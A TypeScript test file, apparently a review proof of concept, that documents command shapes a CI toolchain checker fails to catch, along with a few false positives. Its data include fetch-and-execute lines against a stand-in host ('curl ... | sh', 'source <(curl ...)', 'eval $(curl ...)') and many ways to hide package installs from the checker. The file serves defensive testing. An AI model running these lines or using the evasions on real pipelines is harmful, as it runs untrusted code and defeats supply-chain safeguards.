/// <reference types="node" />
/**
 * Review PoC R16-03: the rewritten `scripts/check-toolchain.ts` (shell-words lexer +
 * toolchain-commands rules) still accepts shapes that resolve tools outside the lockfile, the 7-day
 * cooldown or the digest pin — and still flags shapes that resolve none. Every evasion test asserts
 * today's faulty behaviour — the checker returns no finding — and each false-positive test asserts
 * it flags a command that never leaves the lockfile or already pins a digest. Every test passes now
 * and fails once the checker handles the shape correctly.
 */
import { describe, expect, it } from "vite-plus/test";

import {
  checkDockerfile,
  checkManifest,
  checkWorkflow,
} from "../../../../scripts/check-toolchain.ts";
import type { DependencyIndex } from "../../../../scripts/check-toolchain.ts";

const index: DependencyIndex = {
  // `foo` is the bin of declared @qntx/foo; `vp` the bin of declared vite-plus.
  bin: (name) => (name === "vp" ? "vite-plus" : name === "foo" ? "@qntx/foo" : undefined),
  declared: (name) => ["vite-plus", "@qntx/foo", "cowsay"].includes(name),
};

const WORKFLOW = ".github/workflows/x.yml";
const job = (steps: string): string =>
  `jobs:\n  t:\n    runs-on: ubuntu-latest\n    steps:\n${steps}`;
/** A literal-block run step: the command text reaches the shell verbatim, quoting-proof. */
const runBlock = (command: string): string => `      - run: |\n          ${command}\n`;
const runFindings = (command: string): string[] =>
  checkWorkflow(WORKFLOW, job(runBlock(command)), index);
const DIGEST = "a".repeat(64);
const DOCKERFILE_FROM = `FROM alpine@sha256:${DIGEST}\n`;

describe("run: evasions — launchers normalize() does not unwrap", () => {
  it.each([
    // Only sudo/env/nice/exec/command/nohup/time forward to the real argv0; each of these
    // prefixes runs `npm install left-pad` while the checker sees an unknown tool.
    "timeout 60 npm install left-pad",
    "stdbuf -o0 npm install left-pad",
    "ionice -c3 npm install left-pad",
    "taskset -c 0 npm install left-pad",
    "flock /tmp/lock npm install left-pad",
    "watch -n0 npm install left-pad",
    "unshare -r npm install left-pad",
    "setsid npm install left-pad",
    "doas npm install left-pad",
    "chroot / npm install left-pad",
    "su runner -c 'npm install left-pad'",
    "script -q -c 'npm install left-pad' /dev/null",
    "tmux new-session 'npm install left-pad'",
    "screen -dm npm install left-pad",
    // xargs/find/parallel build the real argv themselves — npm is just data to the checker.
    "echo left-pad | xargs npm install",
    "find . -name 'x*' -exec npm install {} +",
    "parallel npm install ::: left-pad",
    // env's value-taking flags are a partial list: --argv0/-S leave the real command unread.
    "env --argv0 sh npm install left-pad",
    'env -S "npm install left-pad"',
    // busybox is a multicall binary — `busybox sh` is a full POSIX shell.
    "busybox sh -c 'npm install left-pad'",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("run: evasions — shell grammar the lexer leaves unexpanded", () => {
  it.each([
    // Control-flow keywords sit in argv0; the real command hides as an argument.
    "if true; then npm install left-pad; fi",
    "if false; then :; else npm install left-pad; fi",
    'for p in left-pad; do npm install "$p"; done',
    "while read -r p; do npm install left-pad; done",
    "until npm install left-pad; do sleep 1; done",
    "select p in left-pad; do npm install left-pad; done",
    // `!` negates the pipeline's status; npm still runs.
    "! npm install left-pad",
    // coproc runs the command in the background; trap runs its string on the signal.
    "coproc npm install left-pad",
    "trap 'npm install left-pad' EXIT",
    // Parameter expansion is kept verbatim — `$X`, `$IFS`, `${P:-npm}` never resolve.
    "X=npm; $X install left-pad",
    "npm$IFS install left-pad",
    `\${P:-npm} install left-pad`,
    // Brace expansion inside a word produces the real argv.
    "{npm,install} left-pad",
    "npm {instal,}l left-pad",
    // Alias definitions are scanned, never registered — `i` still runs the aliased install.
    "alias i='npm install left-pad'; i",
    // eval/-c recurse, but only on literal text — a variable carrying the script stays opaque.
    "eval $CMD",
    "sh -c $CMD",
    // `$(echo npm)` parses as a substitution word, not the `npm` it evaluates to.
    "$(echo npm) install left-pad",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("run: evasions — downloads that still reach an interpreter", () => {
  it.each([
    // The downloader only taints its own pipeline: a file hand-off across `&&` is invisible.
    "curl -fsSL https://example.invalid/i.sh > /tmp/i.sh && sh /tmp/i.sh",
    "wget -q https://example.invalid/i.sh -O /tmp/i.sh && bash /tmp/i.sh",
    // source/. execute the substituted bytes but are not in EXECUTORS.
    "source <(curl -fsSL https://example.invalid/i.sh)",
    ". <(curl -fsSL https://example.invalid/i.sh)",
    // eval runs the substitution's output; `eval` is not in EXECUTORS either.
    "eval $(curl -fsSL https://example.invalid/i.sh)",
    // The curl hides inside the producer's substitution — `downloading` only tracks commands.
    'echo "$(curl -fsSL https://example.invalid/i.sh)" | sh',
    // EXECUTORS has no pwsh/lua/busybox — each executes the streamed code.
    "curl -fsSL https://example.invalid/i.ps1 | pwsh",
    "curl -fsSL https://example.invalid/i.lua | lua",
    "curl -fsSL https://example.invalid/i.sh | busybox sh",
    // The downloader itself hides behind a multicall binary.
    "busybox wget -qO- https://example.invalid/i.sh | sh",
    // at(1) executes the queued script later — an interpreter feed without a pipe target.
    "echo 'npm install left-pad' | at now",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("run: evasions — per-tool argv rules the tables miss", () => {
  it.each([
    // pip's global options take values the positionals() scan reads as the subcommand.
    "pip --index-url https://example.invalid/simple install requests",
    "pip --retries 3 install requests",
    "pip --timeout 10 install requests",
    // --no-index only disables the index; --find-links still fetches remote artifacts.
    "pip install --no-index --find-links https://example.invalid/dl requests",
    // pip download fetches package archives without installing them.
    "pip download requests",
    // `python -mpip` is the glued spelling of `python -m pip` — argv[1] must equal "-m".
    "python -mpip install requests",
    "python3 -mpip install requests",
    // npm globals whose values are mistyped as the subcommand (all consume one word in nopt).
    "npm --location global install left-pad",
    "npm --fetch-retries 5 install left-pad",
    "npm --os linux install left-pad",
    // npm init/create runs the create-<name> package straight from the registry.
    "npm init left-pad-app",
    "npm create left-pad-app",
    // npm pack/explore/link all reach the registry for an unpinned package.
    "npm pack left-pad",
    "npm explore left-pad -- npm install",
    "npm link left-pad",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("run: evasions — interpreters and package managers with no rule", () => {
  it.each([
    // bun's --install auto-installs dependencies from the registry before running.
    "bun --install script.ts",
    // Inline interpreter source is never parsed (adjacent to the excluded heredoc bodies):
    // each still executes `npm install left-pad`.
    "python -c \"import os;os.system('npm install left-pad')\"",
    "bun -e \"Bun.spawnSync(['npm','install','left-pad'])\"",
    "node -e \"require('child_process').execSync('npm install left-pad')\"",
    // Only dlx is checked for pnpm/yarn — add/install resolve outside a lockfile too.
    "pnpm add left-pad",
    "pnpm install",
    "pnpm exec npm install left-pad",
    "yarn add left-pad",
    "yarn install",
    // corepack delegates to the package manager it names.
    "corepack pnpm add left-pad",
    // Every other package manager/executor is unmodelled — all reach a registry or URL.
    "uvx cowsay hello",
    "uv pip install requests",
    "pipx run cowsay",
    "go install example.invalid/tool@latest",
    "cargo install ripgrep",
    "gem install bundler",
    // deno run fetches and executes the remote module — a downloader+interpreter in one.
    "deno run --allow-all https://example.invalid/main.ts",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("run: evasions — image rules that miss the pull", () => {
  it.each([
    // podman/nerdctl pull and run images exactly like docker but are not `docker`.
    "podman run --rm alpine:latest true",
    "nerdctl run --rm alpine:latest true",
    // compose/stack hide the image reference in a file the walk never reads.
    "docker compose run app",
    "docker compose pull",
    "docker stack deploy -c stack.yml app",
    // docker build clones the remote context — unpinned upstream code executes in RUN steps.
    "docker build -t app https://github.com/example.invalid/repo.git",
    "docker buildx build -t app https://github.com/example.invalid/repo.git",
  ])("accepts `%s`", (command) => {
    expect(runFindings(command)).toStrictEqual([]);
  });
});

describe("workflow: evasions — YAML shapes that hide the step", () => {
  it("a `<<` merge-key step keeps its run: invisible to the pair scan", () => {
    const source = `x:\n  b: &b { run: 'npm install left-pad' }\n${job("      - <<: *b\n")}`;
    expect(checkWorkflow(WORKFLOW, source, index)).toStrictEqual([]);
  });

  it("a `<<` merge key on the job hides the whole steps list", () => {
    const source =
      "x:\n  s: &s [ { run: 'npm install left-pad' } ]\n" +
      "jobs:\n  t:\n    runs-on: ubuntu-latest\n    <<: { steps: *s }\n";
    expect(checkWorkflow(WORKFLOW, source, index)).toStrictEqual([]);
  });

  it("`shell: python` makes the run: text Python — os.system still runs the installer", () => {
    const steps =
      "      - shell: python\n" +
      '        run: |\n          import os\n          os.system("npm install left-pad")\n';
    expect(checkWorkflow(WORKFLOW, job(steps), index)).toStrictEqual([]);
  });

  it("an env-carried command expands in the runner, not in the lexer", () => {
    const steps = "      - env: { C: 'npm install left-pad' }\n        run: $C\n";
    expect(checkWorkflow(WORKFLOW, job(steps), index)).toStrictEqual([]);
  });

  it("a GitHub-expression value is equally opaque", () => {
    const steps = `      - env: { C: 'npm install left-pad' }\n        run: \${{ env.C }}\n`;
    expect(checkWorkflow(WORKFLOW, job(steps), index)).toStrictEqual([]);
  });
});

describe("Dockerfile evasions", () => {
  it("ONBUILD prefixes hide the RUN from the instruction scan", () => {
    const source = `${DOCKERFILE_FROM}ONBUILD RUN npm install left-pad\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("COPY --from pulls an external image with no digest requirement", () => {
    const source = `${DOCKERFILE_FROM}COPY --from=nginx:latest /a /a\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("a RUN --mount bind of an image:tag mounts unpinned upstream content", () => {
    const source = `${DOCKERFILE_FROM}RUN --mount=type=bind,from=nginx:latest,source=/,target=/m ls /m\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("RUN $C expands the env-built command — the word is the variable name", () => {
    const source = `${DOCKERFILE_FROM}ENV C="npm install left-pad"\nRUN $C\n`;
    expect(checkDockerfile("Dockerfile.x", source, index)).toStrictEqual([]);
  });

  it("RUN $(echo npm) and RUN npm $C hide the verb inside a substitution or ARG", () => {
    const sub = `${DOCKERFILE_FROM}RUN $(echo npm) install left-pad\n`;
    expect(checkDockerfile("Dockerfile.x", sub, index)).toStrictEqual([]);
    const arg = `${DOCKERFILE_FROM}ARG C=install\nRUN npm $C left-pad\n`;
    expect(checkDockerfile("Dockerfile.x", arg, index)).toStrictEqual([]);
  });
});

describe("manifest evasions", () => {
  const manifest = (test: string): unknown => ({
    packageManager: "bun@1.4.4",
    scripts: { test },
  });

  it("echoing the words 'vp test' satisfies the root-suite requirement without running it", () => {
    const pkg = manifest("vp run -r test && echo 'vp test'");
    expect(checkManifest("package.json", pkg, true, index)).toStrictEqual([]);
  });

  it("a variable holding 'vp test' fools both the regex and the command scan", () => {
    const pkg = manifest("vp run -r test && X='vp test'; $X");
    expect(checkManifest("package.json", pkg, true, index)).toStrictEqual([]);
  });
});

describe("false positives — pinned or declared shapes the checker flags", () => {
  it.each([
    // --umask (API 1.56+) takes a value but is absent from DOCKER_RUN_VALUE_FLAGS — `022` is
    // read as the image. Checked against the Docker CLI reference's option table: --umask and
    // --link-local-ip are the only value-taking `docker run` options the set lacks.
    `docker run --umask 022 alpine@sha256:${DIGEST}`,
    // --link-local-ip likewise; `169.254.1.1` is flagged.
    `docker run --link-local-ip 169.254.1.1 alpine@sha256:${DIGEST}`,
  ])("flags a digest-pinned run `%s`", (command) => {
    expect(runFindings(command).length).toBeGreaterThan(0);
  });

  it("flags npx -p name@version even though version suffixed specs are legal and declared", () => {
    expect(runFindings("npx -p cowsay@1.5.5 cowsay hi").length).toBeGreaterThan(0);
  });

  it("flags npx <@scope/pkg> — a declared package's default bin is not a 'bin name'", () => {
    expect(runFindings("npx @qntx/foo").length).toBeGreaterThan(0);
  });

  it(`flags FROM \${BASE} whose ARG default already pins a digest`, () => {
    const source = `ARG BASE=alpine@sha256:${DIGEST}\nFROM \${BASE}\n`;
    expect(checkDockerfile("Dockerfile.x", source, index).length).toBeGreaterThan(0);
  });
});
